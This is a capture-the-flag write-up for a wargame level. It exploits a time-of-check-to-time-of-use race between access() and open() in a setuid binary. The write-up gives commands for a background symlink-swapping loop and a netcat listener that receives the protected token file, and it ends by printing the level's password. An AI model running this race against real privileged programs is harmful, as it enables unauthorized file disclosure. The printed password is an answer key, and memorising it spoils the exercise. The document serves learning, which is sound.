# LEVEL 10

## 💡 Explanation

In this level we have to:
1. Check the permissions of ./level10 and token
2. Execute `./level10`to check what it does => It ask for a file and a file and a host; when providing the file token it complains because we don't have rights, it works when providing another file.
3. To be able to send the file to a host, we'll have to have a host listening => we can just listen on the port 6969 on the same machine and wait for it to receive the file.
4.  Now we have to find out how to send the file token... We check how the binary works by using strace and testing with different files => We can see that it first check the rights of the files using the function `access()` and then it `open()` the file which can lead to a security issue.
5. We have to exploit this security hole by creating a symbolic link from one file to another, so when access checks the permissions it won't have any problem (since it will be pointing to another file) and then it will open the corret one.
6. Once you get the flag, `su flag10` and `getflag`!

HARDEST LEVEL SO FAR!! 🔥🔥

## 👾 Commands

To find the solution:
```
./level10
./level10 token lol
ln -s /home/user/level10/token /tmp/lol; ./level10 /tmp/lol lol
rm /tmp/lol; echo "lol" > /tmp/lol; ./level10 /tmp/lol lol
nc 6969 -l => Run it every time we launch level10 (on a different terminal)
rm /tmp/lol; echo "lol" > /tmp/lol; strace ./level10 /tmp/lol 127.0.0.1
```

To exploit the security hole:
- Running in the background     : `echo "lal" > /tmp/lal; (while true; do ln -fs /tmp/lal /tmp/lol && ln -fs /home/user/level10/token /tmp/lol; done)&`
- Running in a terminal         : `while true ; do nc -l 6969; done`
- Running in another terminal   : `for i in `seq 50`; do ./level10 /tmp/lol 127.0.0.1; done`
- Run it several times if needed! Do not forget to kill the process once you get the flag `kill -9 <pid>`!

## 🔍 Resources

- [How to open a TCP listener?](https://unix.stackexchange.com/questions/214471/how-to-create-a-tcp-listener)
- [Linux access command](https://man7.org/linux/man-pages/man2/access.2.html)
- [Linux open command](https://linux.die.net/man/3/open)
- [Time-of-check to time-of-use](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use)
- [How to exploit the access security hole? I](https://stackoverflow.com/questions/14333112/access2-system-call-security-issue)
- [How to exploit the access security hole? II](https://stackoverflow.com/questions/11525164/what-is-wrong-with-access)
- [How to exploit the access security hole? III](https://stackoverflow.com/questions/7925177/access-security-hole)
- [Linux ln command](https://man7.org/linux/man-pages/man1/ln.1.html)
- [How to kill a process?](https://itsfoss.com/how-to-find-the-process-id-of-a-program-and-kill-it-quick-tip/)

## 🔥 Password
`woupa2yuojeeaaed06riuj63c`
